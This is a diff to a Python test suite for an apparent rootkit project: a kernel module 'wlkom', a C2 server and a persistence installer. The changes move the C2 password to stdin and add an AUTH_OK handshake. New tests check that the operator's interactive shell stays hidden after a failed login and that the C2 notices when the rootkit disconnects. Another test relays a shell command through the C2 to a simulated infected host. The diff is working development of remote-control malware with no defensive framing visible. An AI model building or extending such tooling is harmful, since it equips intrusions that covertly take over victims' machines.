@@ -58,11 +58,11 @@ def test_c2_builds():
     ok("c2 builds")
 
 
-def test_c2_requires_port_and_password():
-    """Vérifie que le C2 refuse de démarrer sans les arguments <port> et <password>."""
+def test_c2_requires_port():
+    """Vérifie que le C2 refuse de démarrer sans l'argument <port>."""
     result = run([str(C2_BIN)])
     if result.returncode == 0:
-        fail("c2 rejects missing args", "c2 succeeded without <port> <password>")
+        fail("c2 rejects missing args", "c2 succeeded without <port>")
     if "Usage:" not in result.stderr:
         fail("c2 rejects missing args", f"unexpected stderr: {result.stderr!r}")
     ok("c2 rejects missing args")
@@ -81,14 +81,17 @@ def test_c2_sends_auth_hash():
     port = free_port()
     password = "secret-test"
     proc = subprocess.Popen(
-        [str(C2_BIN), str(port), password],
+        [str(C2_BIN), str(port)],
         text=True,
+        stdin=subprocess.PIPE,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
     )
     try:
         wait_for_line(proc, "C2 listening", timeout=3.0)
         with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
+            proc.stdin.write(f"{password}\n")
+            proc.stdin.flush()
             data = sock.recv(128)
         expected = f"AUTH {fnv1a_hash(password)}\n".encode()
         if data != expected:
@@ -179,6 +182,7 @@ def test_c2_fnv1a_source():
         ("hash ^= (unsigned char)*str", "FNV-1a xor step"),
         ("hash *= FNV1A_PRIME", "FNV-1a multiply step"),
         ("AUTH %08x\\n", "AUTH frame sends fixed-width hex hash"),
+        ("strcmp(auth_reply, \"AUTH_OK\")", "C2 waits for the module authentication acknowledgement"),
     ]
     for pattern, description in checks:
         require_source(pattern, description, source, "c2 FNV-1a source checks")
@@ -195,6 +199,7 @@ def test_wlkom_password_auth_source():
         ('recv_line(buf, sizeof(buf))', "line-based auth receive"),
         ('strncmp(buf, AUTH_PREFIX, AUTH_PREFIX_LEN)', "AUTH prefix validation"),
         ('strcmp(received_hash, password_hash)', "password hash comparison"),
+        ('send_reply("AUTH_OK\\n")', "successful authentication acknowledgement"),
         ('return -EACCES;', "auth failure error"),
         ('authenticate_c2();', "auth called after connection"),
     ]
@@ -224,6 +229,78 @@ def test_wlkom_exec_source():
     ok("wlkom exec feature source checks")
 
 
+def test_c2_does_not_open_shell_on_auth_rejection():
+    """Verifie que le prompt interactif reste masque si le client ne confirme pas AUTH."""
+    port = free_port()
+    proc = subprocess.Popen(
+        [str(C2_BIN), str(port)],
+        text=True,
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+    )
+    try:
+        wait_for_line(proc, "C2 listening", timeout=3.0)
+        with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
+            proc.stdin.write("reject-test\n")
+            proc.stdin.flush()
+            sock.recv(128)
+            sock.sendall(b"AUTH_FAIL\n")
+        lines = wait_for_line(proc, "Authentication failed", timeout=3.0)
+        if any("WLKOM INTERACTIVE SHELL" in line for line in lines):
+            fail("c2 hides shell after failed auth", f"unexpected shell output: {lines!r}")
+        ok("c2 hides shell after failed auth")
+    finally:
+        proc.terminate()
+        try:
+            proc.wait(timeout=2.0)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait(timeout=2.0)
+
+
+def test_c2_detects_idle_disconnect():
+    """Verifie que le C2 detecte une deconnexion rootkit meme sans nouvelle commande operateur."""
+    port = free_port()
+    password = "idle-disconnect"
+    expected_auth = f"AUTH {fnv1a_hash(password)}\n".encode()
+
+    proc = subprocess.Popen(
+        [str(C2_BIN), str(port)],
+        text=True,
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+    )
+    try:
+        wait_for_line(proc, "C2 listening", timeout=3.0)
+        with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
+            sock.settimeout(3.0)
+            proc.stdin.write(f"{password}\n")
+            proc.stdin.flush()
+
+            auth_data = b""
+            while b"\n" not in auth_data:
+                auth_data += sock.recv(64)
+            if auth_data != expected_auth:
+                fail("c2 detects idle disconnect", f"unexpected AUTH: {auth_data!r}")
+
+            sock.sendall(b"AUTH_OK\n")
+            wait_for_line(proc, "Authentication accepted", timeout=3.0)
+
+        wait_for_line(proc, "Connection lost or rootkit disconnected", timeout=3.0)
+        wait_for_line(proc, "Waiting for rootkit connection", timeout=3.0)
+        ok("c2 detects idle disconnect")
+    finally:
+        proc.stdin.close()
+        proc.terminate()
+        try:
+            proc.wait(timeout=2.0)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait(timeout=2.0)
+
+
 def test_c2_exec_protocol():
     """Lance le C2, simule le rootkit côté socket et vérifie que le C2 relaie la commande et accepte le format de réponse."""
     port = free_port()
@@ -231,7 +308,7 @@ def test_c2_exec_protocol():
     expected_auth = f"AUTH {fnv1a_hash(password)}\n".encode()
 
     proc = subprocess.Popen(
-        [str(C2_BIN), str(port), password],
+        [str(C2_BIN), str(port)],
         text=True,
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE,
@@ -243,12 +320,17 @@ def test_c2_exec_protocol():
         with socket.create_connection(("127.0.0.1", port), timeout=3.0) as sock:
             sock.settimeout(3.0)
 
+            proc.stdin.write(f"{password}\n")
+            proc.stdin.flush()
+
             auth_data = b""
             while b"\n" not in auth_data:
                 auth_data += sock.recv(64)
             if auth_data != expected_auth:
                 fail("c2 exec protocol", f"unexpected AUTH: {auth_data!r}")
 
+            sock.sendall(b"AUTH_OK\n")
+            wait_for_line(proc, "Authentication accepted", timeout=3.0)
             time.sleep(0.2)
 
             proc.stdin.write("id\n")
@@ -294,11 +376,13 @@ def main():
         test_rootkit_makefile_compile_feature,
         test_wlkom_connection_source,
         test_persistence_installer_source,
-        test_c2_requires_port_and_password,
+        test_c2_requires_port,
         test_c2_fnv1a_source,
         test_c2_sends_auth_hash,
         test_wlkom_password_auth_source,
         test_wlkom_exec_source,
+        test_c2_does_not_open_shell_on_auth_rejection,
+        test_c2_detects_idle_disconnect,
         test_c2_exec_protocol,
     ]
     try:
